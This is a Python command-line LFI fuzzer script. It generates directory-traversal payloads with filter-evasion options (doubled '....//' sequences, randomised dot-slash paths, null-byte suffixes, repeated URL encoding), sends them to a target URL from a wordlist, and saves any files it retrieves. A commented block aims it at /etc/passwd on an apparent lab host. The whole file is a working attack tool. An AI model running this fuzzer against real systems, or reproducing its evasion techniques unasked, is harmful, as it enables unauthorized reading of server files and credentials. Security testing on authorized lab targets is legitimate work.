#!/usr/bin/env python3

import argparse
import os
import random
import requests
import urllib
import string
import sys
import time

def random_backpath(n):
    path = '.'
    last_is_dot = False
    dot_running = False
    level = 0

    while True:
        path += random.choice(['.', '/'])

        if path[len(path) - 1] == '.':
            if not dot_running and last_is_dot:
                dot_running = True
                level += 1

                if level >= n:
                    return path + "/"

            last_is_dot = True
        else:
            last_is_dot = False
            dot_running = False


def gen_backpath():
    #./

    #0 ../
    #1 ..//
    #2 ....//
    #3 = 0+1+2+./

    pass


def check_url(base_url, filepath, nb_parent_folder = 10, urlencode_level = 0, folder_prefix = "xxx/",
                evade_remove_backpath = False, append_null = False, use_random_backpath=False):

    null = "\x00"

    if use_random_backpath and nb_parent_folder:
        back_to_root = random_backpath(nb_parent_folder)
    else:
        back_to_root = "../" * nb_parent_folder

    payload = filepath

    if nb_parent_folder:
        if evade_remove_backpath:
            back_to_root = back_to_root.replace('../', '....//')
        payload = back_to_root + payload

    if folder_prefix:
        payload = folder_prefix + payload

    if append_null:
        payload = payload + urllib.parse.quote(null)

    if urlencode_level == 1:
        payload = urllib.parse.quote(payload)
    elif urlencode_level == 2:
        payload = urllib.parse.quote(payload, safe='')
    elif urlencode_level == 3:
        payload = urllib.parse.quote(payload, safe='')
        payload = urllib.parse.quote(payload, safe='')

    full_url = base_url + payload
    result = requests.get(full_url)

    return payload, result


def check_result(result, status = None, error_status = None, min_length = None):

    check = True

    if status is not None and result.status_code not in status:
        check = False

    if error_status is not None and result.status_code in error_status:
        check = False

    if min_length is not None and len(result.text) <= min_length:
        check = False

    return check


def download(result, payload, folder_dest):

    payload = urllib.parse.unquote(payload)
    filename = payload.replace('/', '_')

    with open(folder_dest + "/" + filename, 'w') as f:
        f.write(result.text)


def main():

    print()
    parser = argparse.ArgumentParser(description='LFI Fuzzer')
    parser.add_argument('-u', '--url', required=True, help='URL to fuzz')
    parser.add_argument('-w', '--wordlist', required=True)
    parser.add_argument('-d', '--download', metavar='DIRECTORY', help='Download found files in this directory')
    parser.add_argument('-v', '--verbose', action='store_true', help='Show complete payloads')
    parser.add_argument('-t', '--test', action='store_true', help='Just send a one test')

    parser.add_argument('-s', '--status', default=[200], type=int, action='append', help='Status code allowed')
    parser.add_argument('-e', '--error-status', default=[400,404,500], type=int, action='append', help='Status code to ignore')
    parser.add_argument('-l', '--min-length', default='0', type=int, help='Minimum response length')

    #args = parser.parse_args()
    args, leftovers = parser.parse_known_args()
    #print(args.whitelist_status, args.blacklist_status, args.blacklist_length)


    if args.wordlist and not os.path.isfile(args.wordlist):
        print(f"[-] {args.wordlist} not found")
        exit()

    if args.download and not os.path.isdir(args.download):
        print(f"[-] {args.download} not found")
        exit()



    payload = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    payload, result = check_url(args.url, payload.strip())

    print(f'{payload} : status {result.status_code}, length {len(result.text)})')
    time.sleep(0.5)

    if args.test:
        exit()


    f = open(args.wordlist, 'r')

    for filepath in f:

        if filepath[0] == "#":
            continue

        filepath = filepath.strip()
        payload, result = check_url(args.url, filepath, nb_parent_folder = 15, urlencode_level = 0,
                                    folder_prefix = "/var/www/html/", evade_remove_backpath = False, append_null = False, use_random_backpath=True)


        if check_result(result, args.status, args.error_status, args.min_length):

            if args.verbose:
                print(f'{filepath} : status {result.status_code}, length {len(result.text)}, payload {payload}')
            else:
                print(f'{filepath} : status {result.status_code}, length {len(result.text)}')
            
            if args.download:
                download(result, filepath, args.download)


"""
for x in range(100):
    payload = random_backpath(10) + "etc/passwd"
    payload, result = check_url("http://10.10.165.114/rfi.php?page=", payload, nb_parent_folder=0, folder_prefix='')
    print(f'{payload} : status {result.status_code}, length {len(result.text)})')
"""


if __name__ == "__main__":
    main()
